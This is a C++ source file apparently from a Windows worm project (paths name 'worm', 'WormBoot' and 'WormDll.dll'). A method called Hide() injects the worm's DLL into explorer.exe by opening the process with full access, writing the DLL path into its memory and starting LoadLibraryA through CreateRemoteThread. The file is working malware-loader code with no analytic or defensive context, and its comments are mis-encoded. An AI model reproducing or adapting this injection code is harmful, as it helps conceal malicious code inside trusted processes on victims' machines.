#include "stdafx.h"
#include "Boot.h"
#include "tlhelp32.h"
#include <stdio.h>
#include <iostream>
using namespace std;

CBoot::CBoot()
{
}


CBoot::~CBoot()
{
}

void CBoot::Hide(void)
{
	CreatRemoteThreadInjectDll();
}

DWORD CBoot::GetProcessID(const char *ProcessName)
{
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	//��ȡ���̿���
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot ����ʧ��.\n");
		return -1;
	}

	//�������̿��գ�������ʾÿ�����̵���Ϣ
	BOOL bMore = ::Process32First(hProcessSnap, &pe32);
	while (bMore)
	{
		//printf("�������ƣ�%ls\n", pe32.szExeFile); //����õ���Ӧ���ǿ��ַ�����%ls,��Ȼ�޷�������ӡ
		//printf("����ID��%u\n\n", pe32.th32ProcessID);
		if (lstrcmp(pe32.szExeFile, ProcessName) == 0)
		{
			break;
		}

		bMore = ::Process32Next(hProcessSnap, &pe32);
	}

	//��Ҫ���������snapshot����
	::CloseHandle(hProcessSnap);

	return pe32.th32ProcessID;
}
int CBoot::CreatRemoteThreadInjectDll()
{
	HANDLE hProcess = NULL;
	DWORD dwSize = 0;
	LPVOID pDllAddr = NULL;
	DWORD dwProcessId = GetProcessID(_T("explorer.exe"));
	FARPROC pFunProcAddr = NULL;
	cout << dwProcessId << endl;
	cout << "=================================" << endl;
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (NULL == hProcess)
	{
		//ShowError("OpenProcess");
		cout << "Error" << endl;
		return FALSE;
	}
	char * pszDllFileName = _T("E:\\hack\\new_github\\vs\\windows\\worm\\WormBoot\\x64\\Release\\WormDll.dll");
	dwSize = 1 + ::lstrlen(_T("E:\\hack\\new_github\\vs\\windows\\worm\\WormBoot\\x64\\Release\\WormDll.dll"));

	cout << "OK" << endl;

	pDllAddr = ::VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);

	if (NULL == pDllAddr)
	{
		return FALSE;
	}

	if (FALSE == ::WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL))
	{
		cout << "FAIL" << endl;
		return FALSE;
	}

	pFunProcAddr = ::GetProcAddress(::GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	if (NULL == pFunProcAddr)
	{
		cout << "FAIL2" << endl;
		return FALSE;
	}

	HANDLE hRemoteThread = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunProcAddr, pDllAddr, 0, NULL);

	if (NULL == hRemoteThread)
	{
		cout << "FAIL3" << endl;
		return FALSE;
	}
	::CloseHandle(hProcess);
	cout << "Hello world" << endl;
	return TRUE;

}
